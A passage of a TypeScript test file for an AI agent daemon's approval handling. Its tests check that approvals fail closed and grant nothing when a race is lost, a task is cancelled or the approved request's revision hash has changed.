      pendingApprovals: new Map(),
      approvalRepo: {
        findById: vi.fn().mockResolvedValue({
          id: "cas-cancelled-effect",
          taskId: "task-cancelled-effect",
          status: "pending",
        }),
        resolvePending: vi.fn().mockResolvedValue(true),
      },
      taskRepo: { findById: vi.fn().mockImplementation(() => task) },
      persistApprovalActionRule: vi.fn().mockImplementation(async () => {
        task.status = "cancelled";
        return {};
      }),
      rememberDurableApprovalGrant: vi.fn(),
      resumeTaskAfterDurableWait: vi.fn(),
      updateTask: vi.fn(),
      logEvent: vi.fn(),
    } as Any;
    expect(
      await AgentDaemon.prototype.respondToApproval.call(daemonLike, "cas-cancelled-effect", true),
    ).toBe("not_found");
    expect(daemonLike.rememberDurableApprovalGrant).not.toHaveBeenCalled();
    expect(daemonLike.resumeTaskAfterDurableWait).not.toHaveBeenCalled();
    expect(daemonLike.updateTask).not.toHaveBeenCalled();
  });
  it("does not persist grants or resume a losing durable response", async () => {
    const daemonLike = {
      pendingApprovals: new Map(),
      approvalRepo: {
        findById: vi
          .fn()
          .mockResolvedValue({ id: "cas-loser", taskId: "task-cas", status: "pending" }),
        resolvePending: vi.fn().mockResolvedValue(false),
      },
      taskRepo: { findById: vi.fn().mockReturnValue({ id: "task-cas", status: "blocked" }) },
      persistApprovalActionRule: vi.fn(),
      rememberDurableApprovalGrant: vi.fn(),
      grantExternalFileApprovalsFromDetails: vi.fn(),
      updateTask: vi.fn(),
      logEvent: vi.fn(),
      resumeTaskAfterDurableWait: vi.fn(),
    } as Any;
    expect(await AgentDaemon.prototype.respondToApproval.call(daemonLike, "cas-loser", true)).toBe(
      "not_found",
    );
    expect(daemonLike.persistApprovalActionRule).not.toHaveBeenCalled();
    expect(daemonLike.rememberDurableApprovalGrant).not.toHaveBeenCalled();
    expect(daemonLike.resumeTaskAfterDurableWait).not.toHaveBeenCalled();
    expect(daemonLike.updateTask).not.toHaveBeenCalled();
  });
  it("retires a losing process-local wait without granting or resolving true", async () => {
    const pending = {
      approval: { id: "cas-local-loser", taskId: "task-cas-local", status: "pending" },
      taskId: "task-cas-local",
      resolved: false,
      resolve: vi.fn(),
      reject: vi.fn(),
      timeoutHandle: setTimeout(() => undefined, 60000),
    };
    const daemonLike = {
      pendingApprovals: new Map([["cas-local-loser", pending]]),
      approvalRepo: { resolvePending: vi.fn().mockResolvedValue(false) },
      taskRepo: { findById: vi.fn().mockReturnValue({ status: "blocked" }) },
      persistApprovalActionRule: vi.fn(),
      getExecutorForTask: vi.fn(),
      logEvent: vi.fn(),
    } as Any;
    expect(
      await AgentDaemon.prototype.respondToApproval.call(daemonLike, "cas-local-loser", true),
    ).toBe("not_found");
    expect(pending.reject).toHaveBeenCalledOnce();
    expect(pending.resolve).not.toHaveBeenCalled();
    expect(daemonLike.persistApprovalActionRule).not.toHaveBeenCalled();
    expect(daemonLike.getExecutorForTask).not.toHaveBeenCalled();
    expect(daemonLike.pendingApprovals.size).toBe(0);
  });
  it("rejects an existing wait if grant persistence fails after the winning decision", async () => {
    const pending = {
      approval: { id: "cas-effect-failure", taskId: "task-cas-failure", status: "pending" },
      taskId: "task-cas-failure",
      resolved: false,
      resolve: vi.fn(),
      reject: vi.fn(),
      timeoutHandle: setTimeout(() => undefined, 60000),
    };
    const daemonLike = {
      pendingApprovals: new Map([["cas-effect-failure", pending]]),
      approvalRepo: { resolvePending: vi.fn().mockResolvedValue(true) },
      taskRepo: { findById: vi.fn().mockReturnValue({ status: "blocked" }) },
      persistApprovalActionRule: vi
        .fn()
        .mockRejectedValue(new Error("fixture persistence failure")),
      getExecutorForTask: vi.fn(),
      logEvent: vi.fn(),
    } as Any;
    await expect(
      AgentDaemon.prototype.respondToApproval.call(daemonLike, "cas-effect-failure", true),
    ).rejects.toThrow("fixture persistence failure");
    expect(pending.reject).toHaveBeenCalledOnce();
    expect(pending.resolve).not.toHaveBeenCalled();
    expect(daemonLike.pendingApprovals.size).toBe(0);
    expect(daemonLike.getExecutorForTask).not.toHaveBeenCalled();
  });
});

describe("transport revision handoff", () => {
  function fixture(id: string) {
    const approval = {
      id,
      taskId: "revision-task",
      type: "run_command",
      description: "Review",
      details: { command: "first" },
      requestedAt: Date.now(),
      status: "pending",
    };
    const daemon = {
      pendingApprovals: new Map(),
      approvalRepo: {
        findById: vi.fn().mockResolvedValue(approval),
        approvedRevisionCurrent: vi.fn().mockResolvedValue(true),
        resolvePending: vi.fn().mockResolvedValue(true),
      },
      taskRepo: { findById: vi.fn().mockReturnValue({ status: "blocked" }) },
      persistApprovalActionRule: vi.fn().mockResolvedValue({}),
      resumeTaskAfterDurableWait: vi.fn(),
      rememberDurableApprovalGrant: vi.fn(),
      updateTask: vi.fn(),
      logEvent: vi.fn(),
    } as Any;
    return { approval, daemon };
  }
  it("refuses a changed revision before consuming the approval response key", async () => {
    const { approval, daemon } = fixture("transport-revision-stale");
    const { approvalRequestRevisionHash } = await import("../approval-revision");
    const expected = approvalRequestRevisionHash(approval as Any);
    daemon.approvalRepo.findById.mockResolvedValue({
      ...approval,
      details: { command: "changed" },
    });
    expect(
      await AgentDaemon.prototype.respondToApproval.call(
        daemon,
        approval.id,
        true,
        undefined,
        undefined,
        expected,
      ),
    ).toBe("not_found");
    expect(daemon.approvalRepo.resolvePending).not.toHaveBeenCalled();
    expect(daemon.persistApprovalActionRule).not.toHaveBeenCalled();
    daemon.approvalRepo.findById.mockResolvedValue(approval);
    expect(
      await AgentDaemon.prototype.respondToApproval.call(
        daemon,
        approval.id,
        true,
        undefined,
        undefined,
        expected,
      ),
    ).toBe("handled");
    expect(daemon.approvalRepo.resolvePending).toHaveBeenCalledOnce();
  });
  it("refuses a revision that changes during the durable handoff", async () => {
    const { approval, daemon } = fixture("transport-revision-race");
    const { approvalRequestRevisionHash } = await import("../approval-revision");
    daemon.approvalRepo.findById
      .mockResolvedValueOnce(approval)
      .mockResolvedValueOnce({ ...approval, description: "changed after validation" });
    expect(
      await AgentDaemon.prototype.respondToApproval.call(
        daemon,
        approval.id,
        true,
        undefined,
        undefined,
        approvalRequestRevisionHash(approval as Any),
      ),
    ).toBe("not_found");
    expect(daemon.approvalRepo.resolvePending).not.toHaveBeenCalled();
    expect(daemon.resumeTaskAfterDurableWait).not.toHaveBeenCalled();
  });
  it("does not resolve a different process-local wait revision", async () => {
    const { approval, daemon } = fixture("transport-local-revision");
    const { approvalRequestRevisionHash } = await import("../approval-revision");
    daemon.pendingApprovals.set(approval.id, {
      approval: { ...approval, details: { command: "different local wait" } },
    });
    expect(
      await AgentDaemon.prototype.respondToApproval.call(
        daemon,
        approval.id,
        false,
        undefined,
        undefined,
        approvalRequestRevisionHash(approval as Any),
      ),
    ).toBe("not_found");
    expect(daemon.approvalRepo.resolvePending).not.toHaveBeenCalled();
    expect(daemon.pendingApprovals.has(approval.id)).toBe(true);
  });
  it("passes the claimed route through the exact revision response to the writer", async () => {
    const { approval, daemon } = fixture("transport-claimed-revision");
    const { approvalRequestRevisionHash } = await import("../approval-revision");
    const guard = { routeId: "route", claimId: "claim" };
    expect(
      await AgentDaemon.prototype.respondToApproval.call(
        daemon,
        approval.id,
        true,
        undefined,
        undefined,
        approvalRequestRevisionHash(approval as Any),
        guard,
      ),
    ).toBe("handled");
    expect(daemon.approvalRepo.resolvePending).toHaveBeenCalledWith(
      approval.id,
      "approved",
      approval,
      undefined,
      guard,
    );
  });
  it("refuses a channel claim without the displayed revision", async () => {
    const { approval, daemon } = fixture("transport-missing-revision");
    await expect(
      AgentDaemon.prototype.respondToApproval.call(
        daemon,
        approval.id,
        true,
        undefined,
        undefined,
        undefined,
        { routeId: "route", claimId: "claim" },
      ),
    ).rejects.toThrow("displayed revision");
    expect(daemon.approvalRepo.resolvePending).not.toHaveBeenCalled();
  });
  it("fails closed for a concrete review when a restarted caller has no displayed revision", async () => {
    const { approval, daemon } = fixture("transport-missing-review-revision");
    daemon.approvalRepo.findById.mockResolvedValue({
      ...approval,
      details: { reviewFiles: ["draft.md"] },
    });

    await expect(
      AgentDaemon.prototype.respondToApproval.call(daemon, approval.id, true, undefined, undefined),
    ).resolves.toBe("not_found");
    expect(daemon.approvalRepo.resolvePending).not.toHaveBeenCalled();
    expect(daemon.persistApprovalActionRule).not.toHaveBeenCalled();
  });
  it("fails closed when the displayed local review is concrete but the persisted row changed", async () => {
    const { approval, daemon } = fixture("transport-local-missing-review-revision");
    const localApproval = { ...approval, details: { draftRevision: { state: "bound" } } };
    const pending = { approval: localApproval, resolved: false };
    daemon.pendingApprovals.set(approval.id, pending);

    await expect(
      AgentDaemon.prototype.respondToApproval.call(daemon, approval.id, true, undefined, undefined),
    ).resolves.toBe("not_found");
    expect(daemon.approvalRepo.resolvePending).not.toHaveBeenCalled();
    expect(daemon.persistApprovalActionRule).not.toHaveBeenCalled();
    expect(daemon.rememberDurableApprovalGrant).not.toHaveBeenCalled();
    expect(daemon.pendingApprovals.get(approval.id)).toBe(pending);
    expect(pending.resolved).toBe(false);
  });
});

describe("approval event revision presentation", () => {
  it("persists the main-computed hash beside the request shown to the renderer", async () => {
    const approval = {
      id: "approval-event-revision",
      taskId: "approval-event-task",
      type: "run_command",
      description: "Review this command",
      details: { command: "node --version" },
      status: "pending",
      requestedAt: Date.now(),
    };
    const { approvalRequestRevisionHash } = await import("../approval-revision");
    const persistTimelineEvent = vi.fn();
    const daemon = {
      taskRepo: { findById: vi.fn().mockReturnValue({ status: "blocked" }) },
      normalizeArtifactEventPayload: vi.fn(),
      maybeEnrichLlmTelemetryPayload: vi.fn(),
      getCurrentEventSeq: vi.fn().mockReturnValue(0),
      nextEventSeq: vi.fn().mockReturnValue(1),
      activeTimelineStageByTask: new Map(),
      transitionTimelineStage: vi.fn(),
      trackTimelineStepState: vi.fn(),
      trackEvidenceRefs: vi.fn(),
      timelineMetrics: { totalEvents: 0, orderViolations: 0, droppedEvents: 0 },
      persistTimelineEvent,
      maybeEmitAssistantMediaPreview: vi.fn(),
    } as Any;

    (AgentDaemon.prototype as Any).logEventWithinTaskRowReadScope.call(
      daemon,
      approval.taskId,
      "approval_requested",
      { approval },
    );

    const [event, legacy] = persistTimelineEvent.mock.calls[0];
    expect(event.payload.approval.revisionHash).toBe(approvalRequestRevisionHash(approval as Any));
    expect(legacy.legacyPayload.approval.revisionHash).toBe(
      approvalRequestRevisionHash(approval as Any),
    );
  });
});
